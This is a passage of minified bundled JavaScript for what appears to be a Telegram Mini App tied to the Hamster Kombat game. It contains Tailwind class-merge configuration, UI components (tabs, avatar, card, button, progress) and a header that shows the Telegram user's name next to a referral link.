            "col-start": [{
                "col-start": vt()
            }],
            "col-end": [{
                "col-end": vt()
            }],
            "grid-rows": [{
                "grid-rows": [ur]
            }],
            "row-start-end": [{
                row: ["auto", {
                    span: [sr, O]
                }, O]
            }],
            "row-start": [{
                "row-start": vt()
            }],
            "row-end": [{
                "row-end": vt()
            }],
            "grid-flow": [{
                "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
            }],
            "auto-cols": [{
                "auto-cols": ["auto", "min", "max", "fr", O]
            }],
            "auto-rows": [{
                "auto-rows": ["auto", "min", "max", "fr", O]
            }],
            gap: [{
                gap: [p]
            }],
            "gap-x": [{
                "gap-x": [p]
            }],
            "gap-y": [{
                "gap-y": [p]
            }],
            "justify-content": [{
                justify: ["normal", "start", "end", "center", "between", "around", "evenly", "stretch"]
            }],
            "justify-items": [{
                "justify-items": ["start", "end", "center", "stretch"]
            }],
            "justify-self": [{
                "justify-self": ["auto", "start", "end", "center", "stretch"]
            }],
            "align-content": [{
                content: ["normal", "start", "end", "center", "between", "around", "evenly", "stretch", "baseline"]
            }],
            "align-items": [{
                items: ["start", "end", "center", "baseline", "stretch"]
            }],
            "align-self": [{
                self: ["auto", "start", "end", "center", "stretch", "baseline"]
            }],
            "place-content": [{
                "place-content": ["start", "end", "center", "between", "around", "evenly", "stretch", "baseline"]
            }],
            "place-items": [{
                "place-items": ["start", "end", "center", "baseline", "stretch"]
            }],
            "place-self": [{
                "place-self": ["auto", "start", "end", "center", "stretch"]
            }],
            p: [{
                p: [c]
            }],
            px: [{
                px: [c]
            }],
            py: [{
                py: [c]
            }],
            ps: [{
                ps: [c]
            }],
            pe: [{
                pe: [c]
            }],
            pt: [{
                pt: [c]
            }],
            pr: [{
                pr: [c]
            }],
            pb: [{
                pb: [c]
            }],
            pl: [{
                pl: [c]
            }],
            m: [{
                m: [S]
            }],
            mx: [{
                mx: [S]
            }],
            my: [{
                my: [S]
            }],
            ms: [{
                ms: [S]
            }],
            me: [{
                me: [S]
            }],
            mt: [{
                mt: [S]
            }],
            mr: [{
                mr: [S]
            }],
            mb: [{
                mb: [S]
            }],
            ml: [{
                ml: [S]
            }],
            "space-x": [{
                "space-x": [j]
            }],
            "space-x-reverse": ["space-x-reverse"],
            "space-y": [{
                "space-y": [j]
            }],
            "space-y-reverse": ["space-y-reverse"],
            w: [{
                w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", O, t]
            }],
            "min-w": [{
                "min-w": [O, t, "min", "max", "fit"]
            }],
            "max-w": [{
                "max-w": [O, t, "none", "full", "min", "max", "fit", "prose", {
                    screen: [wt]
                }, wt]
            }],
            h: [{
                h: [O, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            "min-h": [{
                "min-h": [O, t, "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            "max-h": [{
                "max-h": [O, t, "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            size: [{
                size: [O, t, "auto", "min", "max", "fit"]
            }],
            "font-size": [{
                text: ["base", wt, yt]
            }],
            "font-smoothing": ["antialiased", "subpixel-antialiased"],
            "font-style": ["italic", "not-italic"],
            "font-weight": [{
                font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", No]
            }],
            "font-family": [{
                font: [ur]
            }],
            "fvn-normal": ["normal-nums"],
            "fvn-ordinal": ["ordinal"],
            "fvn-slashed-zero": ["slashed-zero"],
            "fvn-figure": ["lining-nums", "oldstyle-nums"],
            "fvn-spacing": ["proportional-nums", "tabular-nums"],
            "fvn-fraction": ["diagonal-fractions", "stacked-fractons"],
            tracking: [{
                tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", O]
            }],
            "line-clamp": [{
                "line-clamp": ["none", Yt, No]
            }],
            leading: [{
                leading: ["none", "tight", "snug", "normal", "relaxed", "loose", rt, O]
            }],
            "list-image": [{
                "list-image": ["none", O]
            }],
            "list-style-type": [{
                list: ["none", "disc", "decimal", O]
            }],
            "list-style-position": [{
                list: ["inside", "outside"]
            }],
            "placeholder-color": [{
                placeholder: [e]
            }],
            "placeholder-opacity": [{
                "placeholder-opacity": [f]
            }],
            "text-alignment": [{
                text: ["left", "center", "right", "justify", "start", "end"]
            }],
            "text-color": [{
                text: [e]
            }],
            "text-opacity": [{
                "text-opacity": [f]
            }],
            "text-decoration": ["underline", "overline", "line-through", "no-underline"],
            "text-decoration-style": [{
                decoration: ["solid", "dashed", "dotted", "double", "none", "wavy"]
            }],
            "text-decoration-thickness": [{
                decoration: ["auto", "from-font", rt, yt]
            }],
            "underline-offset": [{
                "underline-offset": ["auto", rt, O]
            }],
            "text-decoration-color": [{
                decoration: [e]
            }],
            "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
            "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
            "text-wrap": [{
                text: ["wrap", "nowrap", "balance", "pretty"]
            }],
            indent: [{
                indent: A()
            }],
            "vertical-align": [{
                align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", O]
            }],
            whitespace: [{
                whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
            }],
            break: [{
                break: ["normal", "words", "all", "keep"]
            }],
            hyphens: [{
                hyphens: ["none", "manual", "auto"]
            }],
            content: [{
                content: ["none", O]
            }],
            "bg-attachment": [{
                bg: ["fixed", "local", "scroll"]
            }],
            "bg-clip": [{
                "bg-clip": ["border", "padding", "content", "text"]
            }],
            "bg-opacity": [{
                "bg-opacity": [f]
            }],
            "bg-origin": [{
                "bg-origin": ["border", "padding", "content"]
            }],
            "bg-position": [{
                bg: ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top", Qg]
            }],
            "bg-repeat": [{
                bg: ["no-repeat", {
                    repeat: ["", "x", "y", "round", "space"]
                }]
            }],
            "bg-size": [{
                bg: ["auto", "cover", "contain", Gg]
            }],
            "bg-image": [{
                bg: ["none", {
                    "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
                }, Xg]
            }],
            "bg-color": [{
                bg: [e]
            }],
            "gradient-from-pos": [{
                from: [w]
            }],
            "gradient-via-pos": [{
                via: [w]
            }],
            "gradient-to-pos": [{
                to: [w]
            }],
            "gradient-from": [{
                from: [g]
            }],
            "gradient-via": [{
                via: [g]
            }],
            "gradient-to": [{
                to: [g]
            }],
            rounded: [{
                rounded: [l]
            }],
            "rounded-s": [{
                "rounded-s": [l]
            }],
            "rounded-e": [{
                "rounded-e": [l]
            }],
            "rounded-t": [{
                "rounded-t": [l]
            }],
            "rounded-r": [{
                "rounded-r": [l]
            }],
            "rounded-b": [{
                "rounded-b": [l]
            }],
            "rounded-l": [{
                "rounded-l": [l]
            }],
            "rounded-ss": [{
                "rounded-ss": [l]
            }],
            "rounded-se": [{
                "rounded-se": [l]
            }],
            "rounded-ee": [{
                "rounded-ee": [l]
            }],
            "rounded-es": [{
                "rounded-es": [l]
            }],
            "rounded-tl": [{
                "rounded-tl": [l]
            }],
            "rounded-tr": [{
                "rounded-tr": [l]
            }],
            "rounded-br": [{
                "rounded-br": [l]
            }],
            "rounded-bl": [{
                "rounded-bl": [l]
            }],
            "border-w": [{
                border: [s]
            }],
            "border-w-x": [{
                "border-x": [s]
            }],
            "border-w-y": [{
                "border-y": [s]
            }],
            "border-w-s": [{
                "border-s": [s]
            }],
            "border-w-e": [{
                "border-e": [s]
            }],
            "border-w-t": [{
                "border-t": [s]
            }],
            "border-w-r": [{
                "border-r": [s]
            }],
            "border-w-b": [{
                "border-b": [s]
            }],
            "border-w-l": [{
                "border-l": [s]
            }],
            "border-opacity": [{
                "border-opacity": [f]
            }],
            "border-style": [{
                border: ["solid", "dashed", "dotted", "double", "none", "hidden"]
            }],
            "divide-x": [{
                "divide-x": [s]
            }],
            "divide-x-reverse": ["divide-x-reverse"],
            "divide-y": [{
                "divide-y": [s]
            }],
            "divide-y-reverse": ["divide-y-reverse"],
            "divide-opacity": [{
                "divide-opacity": [f]
            }],
            "divide-style": [{
                divide: ["solid", "dashed", "dotted", "double", "none"]
            }],
            "border-color": [{
                border: [o]
            }],
            "border-color-x": [{
                "border-x": [o]
            }],
            "border-color-y": [{
                "border-y": [o]
            }],
            "border-color-t": [{
                "border-t": [o]
            }],
            "border-color-r": [{
                "border-r": [o]
            }],
            "border-color-b": [{
                "border-b": [o]
            }],
            "border-color-l": [{
                "border-l": [o]
            }],
            "divide-color": [{
                divide: [o]
            }],
            "outline-style": [{
                outline: ["", "solid", "dashed", "dotted", "double", "none"]
            }],
            "outline-offset": [{
                "outline-offset": [rt, O]
            }],
            "outline-w": [{
                outline: [rt, yt]
            }],
            "outline-color": [{
                outline: [e]
            }],
            "ring-w": [{
                ring: Qe()
            }],
            "ring-w-inset": ["ring-inset"],
            "ring-color": [{
                ring: [e]
            }],
            "ring-opacity": [{
                "ring-opacity": [f]
            }],
            "ring-offset-w": [{
                "ring-offset": [rt, yt]
            }],
            "ring-offset-color": [{
                "ring-offset": [e]
            }],
            shadow: [{
                shadow: ["", "inner", "none", wt, Jg]
            }],
            "shadow-color": [{
                shadow: [ur]
            }],
            opacity: [{
                opacity: [f]
            }],
            "mix-blend": [{
                "mix-blend": ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity", "plus-lighter", "plus-darker"]
            }],
            "bg-blend": [{
                "bg-blend": ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"]
            }],
            filter: [{
                filter: ["", "none"]
            }],
            blur: [{
                blur: [n]
            }],
            brightness: [{
                brightness: [r]
            }],
            contrast: [{
                contrast: [a]
            }],
            "drop-shadow": [{
                "drop-shadow": ["", "none", wt, O]
            }],
            grayscale: [{
                grayscale: [u]
            }],
            "hue-rotate": [{
                "hue-rotate": [d]
            }],
            invert: [{
                invert: [m]
            }],
            saturate: [{
                saturate: [h]
            }],
            sepia: [{
                sepia: [C]
            }],
            "backdrop-filter": [{
                "backdrop-filter": ["", "none"]
            }],
            "backdrop-blur": [{
                "backdrop-blur": [n]
            }],
            "backdrop-brightness": [{
                "backdrop-brightness": [r]
            }],
            "backdrop-contrast": [{
                "backdrop-contrast": [a]
            }],
            "backdrop-grayscale": [{
                "backdrop-grayscale": [u]
            }],
            "backdrop-hue-rotate": [{
                "backdrop-hue-rotate": [d]
            }],
            "backdrop-invert": [{
                "backdrop-invert": [m]
            }],
            "backdrop-opacity": [{
                "backdrop-opacity": [f]
            }],
            "backdrop-saturate": [{
                "backdrop-saturate": [h]
            }],
            "backdrop-sepia": [{
                "backdrop-sepia": [C]
            }],
            "border-collapse": [{
                border: ["collapse", "separate"]
            }],
            "border-spacing": [{
                "border-spacing": [i]
            }],
            "border-spacing-x": [{
                "border-spacing-x": [i]
            }],
            "border-spacing-y": [{
                "border-spacing-y": [i]
            }],
            "table-layout": [{
                table: ["auto", "fixed"]
            }],
            caption: [{
                caption: ["top", "bottom"]
            }],
            transition: [{
                transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", O]
            }],
            duration: [{
                duration: H()
            }],
            ease: [{
                ease: ["linear", "in", "out", "in-out", O]
            }],
            delay: [{
                delay: H()
            }],
            animate: [{
                animate: ["none", "spin", "ping", "pulse", "bounce", O]
            }],
            transform: [{
                transform: ["", "gpu", "none"]
            }],
            scale: [{
                scale: [k]
            }],
            "scale-x": [{
                "scale-x": [k]
            }],
            "scale-y": [{
                "scale-y": [k]
            }],
            rotate: [{
                rotate: [sr, O]
            }],
            "translate-x": [{
                "translate-x": [E]
            }],
            "translate-y": [{
                "translate-y": [E]
            }],
            "skew-x": [{
                "skew-x": [T]
            }],
            "skew-y": [{
                "skew-y": [T]
            }],
            "transform-origin": [{
                origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", O]
            }],
            accent: [{
                accent: ["auto", e]
            }],
            appearance: [{
                appearance: ["none", "auto"]
            }],
            cursor: [{
                cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", O]
            }],
            "caret-color": [{
                caret: [e]
            }],
            "pointer-events": [{
                "pointer-events": ["none", "auto"]
            }],
            resize: [{
                resize: ["none", "y", "x", ""]
            }],
            "scroll-behavior": [{
                scroll: ["auto", "smooth"]
            }],
            "scroll-m": [{
                "scroll-m": A()
            }],
            "scroll-mx": [{
                "scroll-mx": A()
            }],
            "scroll-my": [{
                "scroll-my": A()
            }],
            "scroll-ms": [{
                "scroll-ms": A()
            }],
            "scroll-me": [{
                "scroll-me": A()
            }],
            "scroll-mt": [{
                "scroll-mt": A()
            }],
            "scroll-mr": [{
                "scroll-mr": A()
            }],
            "scroll-mb": [{
                "scroll-mb": A()
            }],
            "scroll-ml": [{
                "scroll-ml": A()
            }],
            "scroll-p": [{
                "scroll-p": A()
            }],
            "scroll-px": [{
                "scroll-px": A()
            }],
            "scroll-py": [{
                "scroll-py": A()
            }],
            "scroll-ps": [{
                "scroll-ps": A()
            }],
            "scroll-pe": [{
                "scroll-pe": A()
            }],
            "scroll-pt": [{
                "scroll-pt": A()
            }],
            "scroll-pr": [{
                "scroll-pr": A()
            }],
            "scroll-pb": [{
                "scroll-pb": A()
            }],
            "scroll-pl": [{
                "scroll-pl": A()
            }],
            "snap-align": [{
                snap: ["start", "end", "center", "align-none"]
            }],
            "snap-stop": [{
                snap: ["normal", "always"]
            }],
            "snap-type": [{
                snap: ["none", "x", "y", "both"]
            }],
            "snap-strictness": [{
                snap: ["mandatory", "proximity"]
            }],
            touch: [{
                touch: ["auto", "none", "manipulation"]
            }],
            "touch-x": [{
                "touch-pan": ["x", "left", "right"]
            }],
            "touch-y": [{
                "touch-pan": ["y", "up", "down"]
            }],
            "touch-pz": ["touch-pinch-zoom"],
            select: [{
                select: ["none", "text", "all", "auto"]
            }],
            "will-change": [{
                "will-change": ["auto", "scroll", "contents", "transform", O]
            }],
            fill: [{
                fill: [e, "none"]
            }],
            "stroke-w": [{
                stroke: [rt, yt, No]
            }],
            stroke: [{
                stroke: [e, "none"]
            }],
            sr: ["sr-only", "not-sr-only"],
            "forced-color-adjust": [{
                "forced-color-adjust": ["auto", "none"]
            }]
        },
        conflictingClassGroups: {
            overflow: ["overflow-x", "overflow-y"],
            overscroll: ["overscroll-x", "overscroll-y"],
            inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
            "inset-x": ["right", "left"],
            "inset-y": ["top", "bottom"],
            flex: ["basis", "grow", "shrink"],
            gap: ["gap-x", "gap-y"],
            p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
            px: ["pr", "pl"],
            py: ["pt", "pb"],
            m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
            mx: ["mr", "ml"],
            my: ["mt", "mb"],
            size: ["w", "h"],
            "font-size": ["leading"],
            "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
            "fvn-ordinal": ["fvn-normal"],
            "fvn-slashed-zero": ["fvn-normal"],
            "fvn-figure": ["fvn-normal"],
            "fvn-spacing": ["fvn-normal"],
            "fvn-fraction": ["fvn-normal"],
            "line-clamp": ["display", "overflow"],
            rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
            "rounded-s": ["rounded-ss", "rounded-es"],
            "rounded-e": ["rounded-se", "rounded-ee"],
            "rounded-t": ["rounded-tl", "rounded-tr"],
            "rounded-r": ["rounded-tr", "rounded-br"],
            "rounded-b": ["rounded-br", "rounded-bl"],
            "rounded-l": ["rounded-tl", "rounded-bl"],
            "border-spacing": ["border-spacing-x", "border-spacing-y"],
            "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
            "border-w-x": ["border-w-r", "border-w-l"],
            "border-w-y": ["border-w-t", "border-w-b"],
            "border-color": ["border-color-t", "border-color-r", "border-color-b", "border-color-l"],
            "border-color-x": ["border-color-r", "border-color-l"],
            "border-color-y": ["border-color-t", "border-color-b"],
            "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
            "scroll-mx": ["scroll-mr", "scroll-ml"],
            "scroll-my": ["scroll-mt", "scroll-mb"],
            "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
            "scroll-px": ["scroll-pr", "scroll-pl"],
            "scroll-py": ["scroll-pt", "scroll-pb"],
            touch: ["touch-x", "touch-y", "touch-pz"],
            "touch-x": ["touch"],
            "touch-y": ["touch"],
            "touch-pz": ["touch"]
        },
        conflictingClassGroupModifiers: {
            "font-size": ["leading"]
        }
    };
}
const ny = $g(ty);
function de(...e) {
    return ny(Cg(e));
}
const ry = _g,
    tp = x.forwardRef(({
        className: e,
        ...t
    }, n) => v.jsx(Kf, {
        ref: n,
        className: de("inline-flex h-10 items-center justify-center rounded-md bg-muted p-1 text-muted-foreground", e),
        ...t
    }));
tp.displayName = Kf.displayName;
const fn = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx(Gf, {
    ref: n,
    className: de("inline-flex items-center justify-center whitespace-nowrap rounded-sm px-3 py-1.5 text-sm font-medium ring-offset-background transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 data-[state=active]:bg-background data-[state=active]:text-foreground data-[state=active]:shadow-sm", e),
    ...t
}));
fn.displayName = Gf.displayName;
const pn = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx(Qf, {
    ref: n,
    className: de("mt-2 ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2", e),
    ...t
}));
pn.displayName = Qf.displayName;
var Iu = "Avatar",
    [oy, A0] = Xr(Iu),
    [ly, np] = oy(Iu),
    rp = x.forwardRef((e, t) => {
        const {
            __scopeAvatar: n,
            ...r
        } = e,
            [o, l] = x.useState("idle");
        return v.jsx(ly, {
            scope: n,
            imageLoadingStatus: o,
            onImageLoadingStatusChange: l,
            children: v.jsx(Ge.span, {
                ...r,
                ref: t
            })
        });
    });
rp.displayName = Iu;
var op = "AvatarImage",
    lp = x.forwardRef((e, t) => {
        const {
            __scopeAvatar: n,
            src: r,
            onLoadingStatusChange: o = () => { },
            ...l
        } = e,
            i = np(op, n),
            s = iy(r),
            a = Vl(u => {
                o(u), i.onImageLoadingStatusChange(u);
            });
        return Ur(() => {
            "idle" !== s && a(s);
        }, [s, a]), "loaded" === s ? v.jsx(Ge.img, {
            ...l,
            ref: t,
            src: r
        }) : null;
    });
lp.displayName = op;
var ip = "AvatarFallback",
    sp = x.forwardRef((e, t) => {
        const {
            __scopeAvatar: n,
            delayMs: r,
            ...o
        } = e,
            l = np(ip, n),
            [i, s] = x.useState(void 0 === r);
        return x.useEffect(() => {
            if (void 0 !== r) {
                const a = window.setTimeout(() => s(!0), r);
                return () => window.clearTimeout(a);
            }
        }, [r]), i && "loaded" !== l.imageLoadingStatus ? v.jsx(Ge.span, {
            ...o,
            ref: t
        }) : null;
    });
function iy(e) {
    const [t, n] = x.useState("idle");
    return Ur(() => {
        if (!e) return void n("error");
        let r = !0;
        const o = new window.Image(),
            l = i => () => {
                r && n(i);
            };
        return n("loading"), o.onload = l("loaded"), o.onerror = l("error"), o.src = e, () => {
            r = !1;
        };
    }, [e]), t;
}
sp.displayName = ip;
var up = rp,
    ap = lp,
    cp = sp;
const dp = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx(up, {
    ref: n,
    className: de("relative flex h-10 w-10 shrink-0 overflow-hidden rounded-full", e),
    ...t
}));
dp.displayName = up.displayName;
const fp = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx(ap, {
    ref: n,
    className: de("aspect-square h-full w-full", e),
    ...t
}));
fp.displayName = ap.displayName;
const pp = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx(cp, {
    ref: n,
    className: de("flex h-full w-full items-center justify-center rounded-full bg-muted", e),
    ...t
}));
pp.displayName = cp.displayName;
const Se = window.Telegram.WebApp.initDataUnsafe.user;
function sy() {
    var _ref, _ref2, _ref3;
    return v.jsxs("div", {
        className: "flex justify-between items-center py-2 px-4 border-b",
        children: [v.jsxs("div", {
            className: "flex items-center gap-2",
            children: [v.jsx("a", {
                href: "https://t.me/hamster_kombat_Bot/start?startapp=kentId541625404",
                target: "_blank",
                rel: "noopener noreferrer",
                children: v.jsx("div", {
                    className: "tg-logo play"
                })
            }), v.jsxs("p", {
                children: ["version: ", "1.2.0"]
            })]
        }), v.jsxs("div", {
            className: "flex items-center gap-2",
            children: [v.jsxs(dp, {
                children: [v.jsx(fp, {
                    src: "https://t.me/hamster_kombat_Bot/start?startapp=kentId541625404"
                }), v.jsx(pp, {
                    children: [
                        localStorage.getItem("generatedCodeCount")
                    ]

                })]
            }), v.jsxs("div", {
                children: [v.jsxs("p", {
                    children: [(_ref = null == Se ? void 0 : Se.first_name) !== null && _ref !== void 0 ? _ref : "Nikname", " ", (_ref2 = null == Se ? void 0 : Se.last_name) !== null && _ref2 !== void 0 ? _ref2 : ""]
                }), v.jsx("p", {
                    className: "text-sm text-muted-foreground",
                    children: null != Se && Se.username ? `@${Se.username}` : (_ref3 = null == Se ? void 0 : Se.id) !== null && _ref3 !== void 0 ? _ref3 : "@username"
                })]
            })]
        })]
    });
}
const uy = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase(),
    mp = (...e) => e.filter((t, n, r) => !!t && r.indexOf(t) === n).join(" ");
var ay = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round"
};
const cy = x.forwardRef(({
    color: e = "currentColor",
    size: t = 24,
    strokeWidth: n = 2,
    absoluteStrokeWidth: r,
    className: o = "",
    children: l,
    iconNode: i,
    ...s
}, a) => x.createElement("svg", {
    ref: a,
    ...ay,
    width: t,
    height: t,
    stroke: e,
    strokeWidth: r ? 24 * Number(n) / Number(t) : n,
    className: mp("lucide", o),
    ...s
}, [...i.map(([u, d]) => x.createElement(u, d)), ...(Array.isArray(l) ? l : [l])])),
    zu = (e, t) => {
        const n = x.forwardRef(({
            className: r,
            ...o
        }, l) => x.createElement(cy, {
            ref: l,
            iconNode: t,
            className: mp(`lucide-${uy(e)}`, r),
            ...o
        }));
        return n.displayName = `${e}`, n;
    },
    Jr = zu("ClipboardCheck", [["rect", {
        width: "8",
        height: "4",
        x: "8",
        y: "2",
        rx: "1",
        ry: "1",
        key: "tgr4d6"
    }], ["path", {
        d: "M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2",
        key: "116196"
    }], ["path", {
        d: "m9 14 2 2 4-4",
        key: "df797q"
    }]]),
    Zr = zu("Copy", [["rect", {
        width: "14",
        height: "14",
        x: "8",
        y: "8",
        rx: "2",
        ry: "2",
        key: "17jyea"
    }], ["path", {
        d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",
        key: "zix9uf"
    }]]),
    qr = zu("WandSparkles", [["path", {
        d: "m21.64 3.64-1.28-1.28a1.21 1.21 0 0 0-1.72 0L2.36 18.64a1.21 1.21 0 0 0 0 1.72l1.28 1.28a1.2 1.2 0 0 0 1.72 0L21.64 5.36a1.2 1.2 0 0 0 0-1.72",
        key: "ul74o6"
    }], ["path", {
        d: "m14 7 3 3",
        key: "1r5n42"
    }], ["path", {
        d: "M5 6v4",
        key: "ilb8ba"
    }], ["path", {
        d: "M19 14v4",
        key: "blhpug"
    }], ["path", {
        d: "M10 2v2",
        key: "7u0qdc"
    }], ["path", {
        d: "M7 8H3",
        key: "zfb6yr"
    }], ["path", {
        d: "M21 16h-4",
        key: "1cnmox"
    }], ["path", {
        d: "M11 3H9",
        key: "1obp7u"
    }]]),
    Kn = x.forwardRef(({
        className: e,
        ...t
    }, n) => v.jsx("div", {
        ref: n,
        className: de("rounded-lg border bg-card text-card-foreground shadow-sm", e),
        ...t
    }));
Kn.displayName = "Card";
const Gn = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx("div", {
    ref: n,
    className: de("flex flex-col space-y-1.5 p-6", e),
    ...t
}));
Gn.displayName = "CardHeader";
const Qn = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx("h3", {
    ref: n,
    className: de("text-2xl font-semibold leading-none tracking-tight", e),
    ...t
}));
Qn.displayName = "CardTitle";
const Yn = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx("p", {
    ref: n,
    className: de("text-sm text-muted-foreground", e),
    ...t
}));
Yn.displayName = "CardDescription";
const Xn = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx("div", {
    ref: n,
    className: de("p-6 pt-0", e),
    ...t
}));
Xn.displayName = "CardContent";
const Jn = x.forwardRef(({
    className: e,
    ...t
}, n) => v.jsx("div", {
    ref: n,
    className: de("flex items-center p-6 pt-0", e),
    ...t
}));
function hp(e) {
    var t,
        n,
        r = "";
    if ("string" == typeof e || "number" == typeof e) r += e; else if ("object" == typeof e) if (Array.isArray(e)) for (t = 0; t < e.length; t++) e[t] && (n = hp(e[t])) && (r && (r += " "), r += n); else for (t in e) e[t] && (r && (r += " "), r += t);
    return r;
}
function dy() {
    for (var e, t, n = 0, r = ""; n < arguments.length;) (e = arguments[n++]) && (t = hp(e)) && (r && (r += " "), r += t);
    return r;
}
Jn.displayName = "CardFooter";
const Ya = e => "boolean" == typeof e ? "".concat(e) : 0 === e ? "0" : e,
    Xa = dy,
    fy = (e, t) => n => {
        var r;
        if (null == (null == t ? void 0 : t.variants)) return Xa(e, null == n ? void 0 : n.class, null == n ? void 0 : n.className);
        const {
            variants: o,
            defaultVariants: l
        } = t,
            i = Object.keys(o).map(u => {
                const d = null == n ? void 0 : n[u],
                    m = null == l ? void 0 : l[u];
                if (null === d) return null;
                const p = Ya(d) || Ya(m);
                return o[u][p];
            }),
            s = n && Object.entries(n).reduce((u, d) => {
                let [m, p] = d;
                return void 0 === p || (u[m] = p), u;
            }, {}),
            a = null == t || null === (r = t.compoundVariants) || void 0 === r ? void 0 : r.reduce((u, d) => {
                let {
                    class: m,
                    className: p,
                    ...g
                } = d;
                return Object.entries(g).every(w => {
                    let [y, S] = w;
                    return Array.isArray(S) ? S.includes({
                        ...l,
                        ...s
                    }[y]) : {
                        ...l,
                        ...s
                    }[y] === S;
                }) ? [...u, m, p] : u;
            }, []);
        return Xa(e, i, a, null == n ? void 0 : n.class, null == n ? void 0 : n.className);
    },
    py = fy("inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50", {
        variants: {
            variant: {
                default: "bg-primary text-primary-foreground hover:bg-primary/90",
                destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
                outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
                secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
                ghost: "hover:bg-accent hover:text-accent-foreground",
                link: "text-primary underline-offset-4 hover:underline"
            },
            size: {
                default: "h-10 px-4 py-2",
                sm: "h-9 rounded-md px-3",
                lg: "h-11 rounded-md px-8",
                icon: "h-10 w-10"
            }
        },
        defaultVariants: {
            variant: "default",
            size: "default"
        }
    }),
    He = x.forwardRef(({
        className: e,
        variant: t,
        size: n,
        asChild: r = !1,
        ...o
    }, l) => {
        const i = r ? Dr : "button";
        return v.jsx(i, {
            className: de(py({
                variant: t,
                size: n,
                className: e
            })),
            ref: l,
            ...o
        });
    });
He.displayName = "Button";
var Ru = "Progress",
    Ou = 100,
    [my, $0] = Xr(Ru),
    [hy, vy] = my(Ru),
    vp = x.forwardRef((e, t) => {
        const {
            __scopeProgress: n,
            value: r = null,
            max: o,
            getValueLabel: l = gy,
            ...i
        } = e;
        (o || 0 === o) && !Ja(o) && console.error(yy(`${o}`, "Progress"));
        const s = Ja(o) ? o : Ou;
        null !== r && !Za(r, s) && console.error(wy(`${r}`, "Progress"));
        const a = Za(r, s) ? r : null,
            u = Sl(a) ? l(a, s) : void 0;
        return v.jsx(hy, {
            scope: n,
            value: a,
            max: s,
            children: v.jsx(Ge.div, {
                "aria-valuemax": s,
                "aria-valuemin": 0,
                "aria-valuenow": Sl(a) ? a : void 0,
                "aria-valuetext": u,
                role: "progressbar",
                "data-state": wp(a, s),
                "data-value": a !== null && a !== void 0 ? a : void 0,
                "data-max": s,
                ...i,
                ref: t
            })
        });
    });
vp.displayName = Ru;
var gp = "ProgressIndicator",
    yp = x.forwardRef((e, t) => {
        var _o$value;
        const {
            __scopeProgress: n,
            ...r
        } = e,
            o = vy(gp, n);
        return v.jsx(Ge.div, {
            "data-state": wp(o.value, o.max),
